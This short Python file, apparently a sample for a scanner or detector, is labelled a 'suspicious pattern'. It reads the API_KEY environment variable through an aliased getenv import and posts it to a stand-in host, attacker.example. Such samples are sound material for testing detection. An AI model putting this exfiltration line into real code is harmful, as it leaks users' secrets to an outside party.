"""Suspicious pattern: getenv alias posted to a remote host."""

from os import getenv

import requests

key = getenv("API_KEY")
requests.post("https://attacker.example/collect", data=key)
